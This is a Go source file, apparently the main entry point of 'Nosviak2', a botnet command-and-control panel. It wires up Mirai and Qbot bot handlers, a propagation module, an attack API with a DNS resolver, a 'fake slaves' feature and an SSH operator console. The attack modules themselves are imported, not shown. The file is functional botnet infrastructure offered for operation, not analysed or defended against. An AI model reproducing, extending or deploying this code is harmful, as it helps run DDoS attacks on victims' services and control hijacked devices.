package main

import (
	attacks "Nosviak2/core/attack"
	"Nosviak2/core/clients"
	"Nosviak2/core/clients/animations"
	"Nosviak2/core/clients/apis"
	"Nosviak2/core/clients/commands"
	deployment "Nosviak2/core/configs"
	"Nosviak2/core/database"
	interference "Nosviak2/core/interface"
	"Nosviak2/core/slaves/fakes"
	"Nosviak2/core/slaves/mirai"
	"Nosviak2/core/slaves/pointer"
	"Nosviak2/core/slaves/propagation"
	"Nosviak2/core/slaves/qbot"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	//"Nosviak2/core/sources/certificates/platform"

	"Nosviak2/core/sources/events"
	"Nosviak2/core/sources/language/static"
	"Nosviak2/core/sources/layouts/json"
	"Nosviak2/core/sources/layouts/toml"
	"Nosviak2/core/sources/ranks"
	"Nosviak2/core/sources/views"
	"Nosviak2/core/sources/webhooks"

	_ "Nosviak2/core/configs/branding"

	"github.com/bogdanovich/dns_resolver"
)

func main() {

	//used so we can view the current build id properly
	//this will hopefully source it to be displayed on the term
	if len(os.Args) >= 2 && os.Args[1] == "-bi" { //allows us to view the parent build id
		fmt.Printf("Nosviak2 Launched - %s\r\nParent BuildID: \x1b[38;5;105m\x1b[0m\r\n", deployment.Version)
		return
	}

	//checks for debug mode properly
	//this will allow for better control without issues
	if len(os.Args) >= 2 && os.Args[1] == "-d" {
		deployment.DebugMode = true                                                    //sets debug mode to true properly
		fmt.Printf("Launching Nosviak2  [DEBUG] - running %s\r\n", deployment.Version) //graphical imaging of the units version information
	} else {
		//graphical imaging of the units version information
		fmt.Printf("Launching Nosviak2 Alpha - running %s\r\n\r\n", deployment.Version)
	}

	fmt.Printf("[sys] GoVersion: [%s] Architecture: [%s]\r\n[sys] Operating System: [%s] Cores/CPU: [%d] Compiler: [%s]\r\n", runtime.Version(), runtime.GOARCH, runtime.GOOS, runtime.NumCPU(), runtime.Compiler)

	fmt.Printf("CONFIG%s\r\n", strings.Repeat("=", 113))

	//creates the new engine without issues
	//this will ensure its been done properly
	engineJson := json.MakeEngine(deployment.Assets, deployment.JsonHierarchy)
	//tries to execute the engine
	//this will make sure its done without issues happening
	creation := engineJson.RunEngine() //executes the engine with error handling
	if creation != nil {               //prints the error and closes the instance without issues
		fmt.Printf("\x1b[48;5;9m\x1b[38;5;15mError: %s\x1b[0m\r\n", creation.Error())
		return //ends instance properly
	} else if !deployment.DebugMode { //non debug mode enabled
		fmt.Printf("[CONFIGURATION] Json expedition has been completed || [assets/*.json] [recursive]\r\n")
	}

	if deployment.DebugMode { //detects debug mode correctly, more information given
		log.Printf("[DEBUG] [JSON Success] [%s]\r\n", deployment.Assets)
		//this will properly execute the commands json
		//allows for better control without issues happening
	}

	//enables the json custom command information
	//allows for better machine controlling without errors
	for name, cmd := range json.CustomCommands { //ranges through
		//checks for nil pointers properly without issues happening
		if cmd == nil || commands.Commands[name] == nil { //checks
			continue //continues looping properly and stops nils
		}
		commands.Commands[name].CommandDescription = cmd.Description                                                        //syncs the information
		commands.Commands[name].CommandPermissions = append(commands.Commands[name].CommandPermissions, cmd.Permissions...) //syncs the information
		commands.Commands[name].Aliases = append(commands.Commands[name].Aliases, cmd.Aliases...)                           //syncs the aliases properly
	}

	//creates the new engine without issues
	//this will ensure its been done properly
	engineToml := toml.MakeEngine(deployment.Assets, deployment.TomlHierarchy)
	//tries to execute the engine
	//this will make sure its done without issues happening
	creation = engineToml.RunEngine() //executes the engine with error handling
	if creation != nil {              //prints the error and closes the instance without issues
		fmt.Printf("\x1b[48;5;9m\x1b[38;5;15mError: %s\x1b[0m\r\n", creation.Error())
		return //ends instance properly
	} else if !deployment.DebugMode { //non debug mode enabled
		fmt.Printf("[CONFIGURATION] Toml expedition has been completed || [assets/*.toml] [non-recursive]\r\n")
	} else if deployment.DebugMode { //detects debug mode correctly, more information given
		log.Printf("[DEBUG] [TOML Success] [%s]\r\n", deployment.Assets)
	}

	attacks.Resolver = dns_resolver.New(toml.AttacksToml.Attacks.DNS.Routes)

	//ranges through all the ranks found
	//this will ensure its done without issues
	for name, s := range toml.RanksToml.Ranks { //ranges through
		ranks.PresetRanks[strings.ToLower(name)] = ranks.RankSettings{
			RankDescription: s.RankDescription, //saves the rank information properly
			MainColour:      s.MainColour, SecondColour: s.SecondColour,
			SignatureCharater: s.SignatureCharater, CloseWhenAwarded: false,
			Manage_ranks: s.Manage_ranks, DisplayInTable: true, //show in table
		}
	}

	//ranges through the presets properly
	//this will ensure its done without errors
	for name, settings := range ranks.PresetRanks { //ranges through all preset ranks properly
		if !settings.DisplayInTable {
			continue
		} //ignores if this is set to false properly so we wont display
		commands.Commands["users"].SubCommands = append(commands.Commands["users"].SubCommands, commands.SubCommand{SubcommandName: name + "=", Description: settings.RankDescription, CommandPermissions: settings.Manage_ranks, RenderRef: true})
		commands.Commands["users"].SubCommands = append(commands.Commands["users"].SubCommands, commands.SubCommand{SubcommandName: name, Description: "view users with " + name, CommandPermissions: settings.Manage_ranks, RenderRef: true})
		commands.Commands["sessions"].SubCommands = append(commands.Commands["sessions"].SubCommands, commands.SubCommand{SubcommandName: name, Description: "view sessions with " + name, CommandPermissions: settings.Manage_ranks, RenderRef: true})
	}

	//tries to connect properly
	//this will ensure its done without issues
	if err := database.MakeConnection(); err != nil { //error handles
		fmt.Printf("\x1b[48;5;9m\x1b[38;5;15mError: %s\x1b[0m\r\n", err.Error())
		return //ends instance properly
	} else if !deployment.DebugMode { //non debug mode enabled
		fmt.Printf("[DATABASE_CONNECTION] Correctly gained access to your database at %s on %s with username %s\r\n", json.ConfigSettings.Database.Name, json.ConfigSettings.Database.Host, json.ConfigSettings.Database.Username)
	} else if deployment.DebugMode { //detects debug mode correctly, more information given
		log.Printf("[DEBUG] [MySQL Success] [%s] [%s]\r\n", json.ConfigSettings.Database.Name, json.ConfigSettings.Database.Host)
	}

	//properly checks if the tables exist properly
	//this will ensure its done without any errors happening
	if there, err := interference.AppearDatabase(); !there || err != nil { //checks properly
		fmt.Printf("[SQL Audit] [failed] [trying to create SQL tables]\r\n") //renders information
		if err := interference.RunTerminalAudit(); err != nil {              //error handles properly without issues
			fmt.Printf("[SQL Audit] [failed] [trying to create SQL tables] [%s]\r\n", err.Error()) //renders information
		}
	}

	//tries to correctly fetch all the branding peices
	//this will make sure its safely done without errors
	if err := views.GatherPeices(filepath.Join(deployment.Assets, "branding")); err != nil {
		fmt.Printf("\x1b[48;5;9m\x1b[38;5;15mError: %s\x1b[0m\r\n", err.Error())
		return //ends instance properly
	} else if deployment.DebugMode { //detects debug mode correctly, more information given
		log.Printf("[DEBUG] [BITL Success] [%d]\r\n", len(views.Subject))
	}

	//runs the event listeners properly
	//this listens for any file update event
	go events.LiveRenderUpdate() //run in routine

	//loads all the webhooks properly without issues happening
	//this will ensure its done without any errors happening on req
	if err := webhooks.RenderWebhooks(); err != nil { //error handles
		fmt.Printf("\x1b[48;5;9m\x1b[38;5;15mError: %s\x1b[0m\r\n", err.Error())
		return //error handles properly
	} else if deployment.DebugMode {
		log.Printf("[DEBUG] [Webhooks loaded] [%d]\r\n", len(webhooks.Webhooking))
	}

	//starts the main animation profile
	//this will include spinners etc properly
	go animations.WorkersRuntime() //starts the animations

	//properly tries to control without issues happening
	//this will make sure its completed without any errors happening
	if _, err := commands.EngineLoader(deployment.Assets, "commands", "text"); err != nil {
		fmt.Printf("\x1b[48;5;9m\x1b[38;5;15mError: %s\x1b[0m\r\n", err.Error())
		return //error handles properly
	}

	//tries to properly load all the bin commands
	//this will ensure its done without any errors happening
	if err := commands.GetBinSettings(deployment.Assets, "commands", "bin"); err != nil {
		fmt.Printf("Hmm, Error: %s\r\n", err.Error())
		return //error handles properly
	}

	fmt.Printf("LISTENERS%s\r\n", strings.Repeat("=", 110))

	//checks for slave routes properly
	//this will ensure its done without errors
	if len(toml.FakeToml.FakeSlaves) > 0 { //checks properly
		fakes.Start() //starts fake slaves properly within the system
	}

	//starts the api system up
	if toml.ApiToml.API.Enabled {
		go func() { //runs in goroutine
			if err := apis.ListenAndServe(); err != nil {
				log.Println(err.Error())
			}
			return
		}()
	}

	//checks for enabled propagation system
	//this will allow access to botcount within it
	if toml.ConfigurationToml.Propagation.Enabled {
		go func() { //runs routine properly and safely
			if err := propagation.MakePropagation(); err != nil {
				log.Println(err.Error()) //fatals the error properly
			}
			return //ends routine
		}()
	}

	//checks if its enabled properly
	//this will ensure its done without errors
	if toml.ConfigurationToml.Mirai.Enabled {
		go func() { //runs in routine properly
			//tries to start the mirai routines
			//this will run the mirai system in the background
			err := mirai.CreateHandler()
			if err != nil { //error handles
				log.Println(err.Error())
			}
			return //ends routine
		}()
	}

	//checks if qbot is enabled properly
	//this will ensure its done without errors
	if toml.ConfigurationToml.Qbot.Enabled { //checks
		go func() {
			//creates the new request properly
			//this will allow connection to connect
			if err := qbot.NewHandler(); err != nil {
				log.Println(err.Error())
			}
			return //ends routine
		}()
	}

	//checks for the enabled command properly
	//this will ensure its done without issues happening
	if toml.ConfigurationToml.Pointer.Enabled {
		go func() { //runs in routine properly
			if err := pointer.MakePointer(); err != nil {
				log.Println(err.Error()) //says error
			}
			return //ends routine
		}()
	}

	//tries to load all static peices properly
	//this will ensure its done without errors happening
	if err := static.GetStatic("static"); err != nil { //err handles properly
		fmt.Printf("\x1b[48;5;9m\x1b[38;5;15mError: %s\x1b[0m\r\n", err.Error())
		return //returns the system
	}

	//NOT BELOW HERE

	//tries to start the ssh server properly
	//this will make sure its done properly without issues
	if err := clients.ProduceClient(); err != nil {
		fmt.Printf("\x1b[48;5;9m\x1b[38;5;15mError: %s\x1b[0m\r\n", err.Error())
		return //ends instance properly
	}
}
